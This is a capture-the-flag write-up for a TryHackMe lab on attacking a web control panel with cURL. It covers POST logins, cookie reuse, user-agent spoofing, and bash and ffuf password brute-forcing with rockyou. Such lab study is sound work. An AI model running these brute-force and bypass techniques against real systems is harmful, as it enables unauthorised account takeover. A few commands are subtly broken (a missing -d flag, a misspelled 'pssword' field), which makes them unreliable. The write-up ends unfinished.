```
▛▀▘      ▜    ▗▐     ▐  ▗            ▗▐  ▌      ▌ ▌▛▀▖▌     ▌ ▌               ▐  ▗        ▛▀▘            ▜    ▗▐  
▙▄ ▚▗▘▛▀▖▐ ▞▀▖▄▜▀ ▝▀▖▜▀ ▄ ▞▀▖▛▀▖ ▌  ▌▄▜▀ ▛▀▖ ▞▀▖▌ ▌▙▄▘▌  ▐▌ ▙▄▌▞▀▖▛▀▖▞▀▖▙▀▖▝▀▖▜▀ ▄ ▞▀▖▛▀▖ ▙▄ ▞▀▌▞▀▌▞▀▘▛▀▖▐ ▞▀▖▄▜▀ 
▌  ▗▚ ▙▄▘▐ ▌ ▌▐▐ ▖▞▀▌▐ ▖▐ ▌ ▌▌ ▌ ▐▐▐ ▐▐ ▖▌ ▌ ▌ ▖▌ ▌▌▚ ▌  ▗▖ ▌ ▌▌ ▌▙▄▘▛▀ ▌  ▞▀▌▐ ▖▐ ▌ ▌▌ ▌ ▌  ▚▄▌▚▄▌▝▀▖▙▄▘▐ ▌ ▌▐▐ ▖
▀▀▘▘ ▘▌   ▘▝▀ ▀▘▀ ▝▀▘ ▀ ▀▘▝▀ ▘ ▘  ▘▘ ▀▘▀ ▘ ▘ ▝▀ ▝▀ ▘ ▘▀▀▘▝▘ ▘ ▘▝▀ ▌  ▝▀▘▘  ▝▀▘ ▀ ▀▘▝▀ ▘ ▘ ▀▀▘▗▄▘▗▄▘▀▀ ▌   ▘▝▀ ▀▘▀ 
```
In this THM room, we use the tool cURL to identify endpoints of a malicious web control
panel and send POST requests to submit the required data. [^1]

Make a POST request to the `/post.php` endpoint with the username admin and the password
admin. What is the flag you receive?
-----------------------------------------------------------------------------------------
The command-line tool `curl` is especially useful for crafting HTTP requests and viewing
the raw response from the server. The `-X` specifies the HTTP verb, `-d` provides the
data we want to sent in the body of the HTTP request, which results in the flag.

`curl -X POST -d "username=admin&password=admin" http://<TARGET_MACHINE_IP>/post.php`

Make a request to the `/cookie.php` endpoint with the username admin and the password
admin and save the cookie. What is the flag your receive?
-----------------------------------------------------------------------------------------
To view all the HTTP response header entries, we can use the `-i` option. This way, we
get the cookie `PHPSESSID` which indicates that we triggered a session.

`curl -i -X POST -d "username=admin&password=admin" http://<TARGET_MACHINE_IP>/cookie.php`

In order, to keep the session alive, we now reuse the cookie after saving it first in
the following manner to get the flag.

```bash
curl -c cookies.txt "username=admin&password=admin" http://<TARGET_MACHINE_IP>/cookie.php # Save the cookie
curl -b cookies.txt http://<TARGET_MACHINE_IP>/cookie.php # Reuse the saved cookie in the next request
```
 
After doing the brute force on the `/bruteforce.php` endpoint, what is the password of
the admin user?
-----------------------------------------------------------------------------------------
For this task, we are instructed to create a file `passwords.txt` and place the following
passwords inside.

> admin123<br>
> password<br>
> letmein<br>
> secretpass<br>
> secret<br>

Then, we create a `bruteforce.sh` script, that loops over every password in the file and
checks if a successful login on the `bruteforce.php` endpoint is possible. It only stops
if the response contains a "Welcome" phrase with the correct password.

```bash
for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://<TARGET_MACHINE_IP>/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done
```

Make a request to the `/agent.php` endpoint with the user-agent TBFC. What is the flag?
-----------------------------------------------------------------------------------------
In the previous paragraph of the task description, we learn how to bypass user agent
checks withthe `-A`  flag and now apply this to the curl request as follows:
`curl -A "TBFC" http://<TARGET_MACHINE_IP>/agent.php`

Bonus question: Can you solve the Final Mission and get the flag?
-----------------------------------------------------------------------------------------
In the hint for the bonus mission, we are advised to use the `rockyou.txt` file for the
brute forcing of the password and that the PIN is between 4000 and 5000. First, we access
the server at `http://<TARGET_MACHINE_IP>/terminal.php?action=panel` with the user agent
"secretcomputer":
`curl -A "secretcomputer" http://<TARGET_MACHINE_IP>/terminal.php?action=panel`

```
{
    "service": "Wormhole Control Panel",
    "endpoints": {
        "\/terminal.php?action=info": "Public info",
        "\/terminal.php?action=login": "POST: username,password",
        "\/terminal.php?action=pin": "POST: attempt PIN to get temporary admin token",
        "\/terminal.php?action=status": "GET: wormhole status",
        "\/terminal.php?action=close": "POST: close wormhole"
    },
    "note": "This panel only answers to terminal user agents. Use the endpoints to fully close the wormhole."
}
```
With this service and endpoints information, we can now start towards closing the
wormhole. Setting the action to *close* is not enough, as we are missing an admin
session, operator token and X-Force header. Next, we bruteforce the *login* action
with the `rockyou.txt` file with a modified `bruteforce.sh` script as follows.

```bash
for pass in $(cat /usr/share/wordlists/rockyou.txt); do
  response=$(curl -s -A "secretcomputer" -X POST -d "username=admin&pssword=$pass"  http://<TARGET_MACHINE_IP>/terminal.php?action=login)
  if ! (grep -q "fail") <<< "$response"; then
    echo "[+] Password found: $pass"
    break
  fi
done
```
However, this script takes very long, so we switch to a fuzzing tool, like `ffuf` for
faster retrieval.
```bash
ffuf -w /usr/share/wordlists/rockyou.txt -X POST -d "username=admin&password=FUZZ" -u http://10.67.128.167/terminal.php?action=login -fr "fail" -debug-log ffuf_logging.txt
```

TBC 

`seq 4000 5000 > numbers.txt`


[^1]: https://tryhackme.com/room/webhackingusingcurl-aoc2025-w8q1a4s7d0
